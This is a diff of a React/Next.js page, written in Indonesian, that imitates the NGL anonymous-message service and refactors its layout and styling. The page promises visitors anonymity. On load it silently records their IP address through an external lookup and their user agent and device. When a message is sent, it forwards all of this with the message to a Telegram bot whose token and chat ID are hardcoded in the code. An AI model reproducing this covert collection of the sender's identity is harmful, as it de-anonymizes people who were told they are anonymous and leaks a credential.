@@ -12,7 +12,6 @@ export default function NGLPage() {
   });
 
   useEffect(() => {
-    // Ambil alamat IP pengguna
     fetch("https://api.ipify.org?format=json")
       .then((res) => res.json())
       .then((data) => {
@@ -29,31 +28,26 @@ export default function NGLPage() {
   }, []);
 
   const parseDeviceInfo = (userAgent) => {
-    // Gunakan regex yang lebih tepat untuk mendeteksi perangkat
-    const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Realme C11|Samsung|Xiaomi|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry|ZTE|TCL|Alcatel|Microsoft)/i;
+    const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Samsung|Xiaomi|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry)/i;
     const match = userAgent.match(deviceRegex);
     if (match) {
-      const deviceDetails = match[0].trim() || "Tidak diketahui";
-      return deviceDetails;
+      return match[0].trim();
     }
     return "Tidak diketahui";
   };
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
-    const chatId = "1516343905";
-    const username = "minn";
-
-    if (message.trim() === "") {
+    if (!message.trim()) {
       alert("Pesan tidak boleh kosong!");
       return;
     }
-
     setLoading(true);
     setSuccess(false);
 
     try {
+      const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
+      const chatId = "1516343905";
       const response = await fetch(
         `https://api.telegram.org/bot${botToken}/sendMessage`,
         {
@@ -61,12 +55,7 @@ export default function NGLPage() {
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: chatId,
-            text: `Pesan anonim dari:
-IP: ${userInfo.ip}
-USER AGENT: ${userInfo.userAgent}
-DEVICE: ${userInfo.device}
-
-PESAN: ${message}`,
+            text: `Pesan anonim dari:\nIP: ${userInfo.ip}\nUSER AGENT: ${userInfo.userAgent}\nDEVICE: ${userInfo.device}\n\nPESAN: ${message}`,
           }),
         }
       );
@@ -84,212 +73,143 @@ PESAN: ${message}`,
     }
   };
 
-  const closePopup = () => {
-    setSuccess(false);
-  };
+  const closePopup = () => setSuccess(false);
 
   return (
     <>
       <Head>
-        <title>NGL - MINN</title>
+        <title>NGL - Minn</title>
         <link
-          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
           rel="stylesheet"
+          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
         />
+        <style>{`
+          body {
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+            background-color: #0d1117;
+            color: #c9d1d9;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+          }
+          .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            padding: 15px 20px;
+            background-color: #161b22;
+          }
+          .navbar .logo {
+            font-size: 24px;
+            color: #58a6ff;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+          }
+          .navbar .logo i {
+            margin-right: 10px;
+          }
+          .content {
+            flex: 1;
+            padding: 20px;
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+          }
+          .message-box {
+            width: 100%;
+            padding: 15px;
+            margin: 20px 0;
+            border: 1px solid #58a6ff;
+            border-radius: 8px;
+            background-color: #161b22;
+            color: #c9d1d9;
+            font-size: 14px;
+          }
+          .send-button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            background-color: #58a6ff;
+            color: #ffffff;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+          }
+          .send-button:hover {
+            background-color: #4a94d6;
+          }
+          .popup-success {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #ffffff;
+            padding: 20px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+          }
+          .popup-success p {
+            color: #333;
+          }
+          .popup-close {
+            background: #58a6ff;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+          }
+          .footer {
+            margin-top: auto;
+            padding: 10px;
+            text-align: center;
+            color: #8b949e;
+          }
+          .footer i {
+            color: #ff7b72;
+          }
+        `}</style>
       </Head>
-      <div className="container">
-        <form onSubmit={handleSubmit}>
-          <div className="profile-message-box">
-            <div className="profile">
-              <img
-                src="https://storage.googleapis.com/a1aa/image/oJ3zaGSZ1S6GBJDZ9FXO2tBaBRqAymQqH8SJD06qu6752i8E.jpg"
-                alt="Profile picture of a cat"
-              />
-              <div>
-                <div className="username">@minn</div>
-                <div className="message">kirimi aku pesan anonim!</div>
-              </div>
-            </div>
-            <textarea
-              className="message-box"
-              value={message}
-              onChange={(e) => setMessage(e.target.value)}
-              placeholder="Kirim pesan anonim padaku..."
-              disabled={loading}
-            ></textarea>
-          </div>
-          <div className="info">
-            <i className="fas fa-lock lock-icon"></i> tanya-jawab anonim
-          </div>
-          <button type="submit" className="send-button" disabled={loading}>
-            {loading ? "Mengirim..." : "Kirim !"}
-          </button>
-        </form>
-
-        {/* Pop-up Success */}
+      <div className="navbar">
+        <div className="logo">
+          <i className="fas fa-angle-double-right"></i> NGL
+        </div>
+      </div>
+      <div className="content">
+        <h1>Kirim Pesan Anonim!</h1>
+        <textarea
+          className="message-box"
+          placeholder="Tuliskan pesan Anda di sini..."
+          value={message}
+          onChange={(e) => setMessage(e.target.value)}
+          disabled={loading}
+        ></textarea>
+        <button
+          className="send-button"
+          onClick={handleSubmit}
+          disabled={loading}
+        >
+          {loading ? "Mengirim..." : "Kirim"}
+        </button>
         {success && (
           <div className="popup-success">
-            <div className="popup-content">
-              <i className="fas fa-check-circle"></i>
-              <p>Pesan berhasil dikirim!</p>
-              <button className="popup-close" onClick={closePopup}>
-                OK
-              </button>
-            </div>
+            <p>Pesan berhasil dikirim!</p>
+            <button className="popup-close" onClick={closePopup}>
+              Tutup
+            </button>
           </div>
         )}
       </div>
-      <style jsx>{`
-        body {
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            height: 100vh;
-            background: linear-gradient(135deg, #ff416c, #ff4b2b, #ffcc00);
-            font-family: Arial, sans-serif;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 850px;
-            padding: 20px;
-            box-sizing: border-box;
-            margin-top: 50px;
-        }
-
-        .profile-message-box {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            box-sizing: border-box;
-        }
-
-        .profile {
-            display: flex;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-
-        .profile img {
-            border-radius: 50%;
-            width: 130px;
-            height: 130px;
-            margin-right: 15px;
-        }
-
-        .profile .username {
-            font-weight: bold;
-            font-size: 40px;
-        }
-
-        .profile .message {
-            margin-top: 2px;
-            font-size: 25px;
-            color: #555;
-        }
-
-        .message-box {
-            background: rgba(128, 128, 128, 0.1);
-            border-radius: 20px;
-            padding: 20px;
-            color: rgba(0, 0, 0, 0.5);
-            font-size: 30px;
-            width: 100%;
-            height: 400px;
-            resize: none;
-            border: none;
-            outline: none;
-            box-sizing: border-box;
-        }
-
-        .info {
-            color: white;
-            margin-bottom: 20px;
-            margin-top: 20px;
-            font-size: 30px;
-            justify-content: center;
-            display: flex;
-        }
-
-        .info .lock-icon {
-            margin-right: 5px;
-        }
-
-        .send-button:hover {
-            background: #333;
-        }
-        .send-button {
-          background: black;
-          color: white;
-          border: none;
-          border-radius: 20px;
-          padding: 20px 40px;
-          font-size: 40px;
-          cursor: pointer;
-          width: 100%;
-          height: 50px;
-          box-sizing: border-box;
-          transition: background 0.3s ease;
-        }
-        .send-button:disabled {
-          background: #ccc;
-          cursor: not-allowed;
-        }
-
-        /* Pop-up Success */
-        .popup-success {
-          position: fixed;
-          top: 50%;
-          left: 50%;
-          transform: translate(-50%, -50%);
-          background: white;
-          border-radius: 20px;
-          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-          padding: 30px;
-          display: flex;
-          align-items: center;
-          flex-direction: column;
-          z-index: 1000;
-          animation: fadeIn 0.3s ease;
-        }
-        .popup-content i {
-          font-size: 50px;
-          color: #4caf50;
-        }
-        .popup-content p {
-          margin: 10px 0;
-          font-size: 16px;
-          font-weight: bold;
-          color: #333;
-        }
-        .popup-close {
-          background: #4caf50;
-          color: white;
-          border: none;
-          padding: 10px 20px;
-          border-radius: 10px;
-          font-size: 14px;
-          cursor: pointer;
-          margin-top: 15px;
-        }
-        .popup-close:hover {
-          background: #45a047;
-        }
-        @keyframes fadeIn {
-          from {
-            opacity: 0;
-            transform: translate(-50%, -60%);
-          }
-          to {
-            opacity: 1;
-            transform: translate(-50%, - 50%);
-          }
-        }
-      `}</style>
+      <div className="footer">
+        Dibuat dengan <i className="fas fa-heart"></i> oleh Minn
+      </div>
     </>
   );
 }
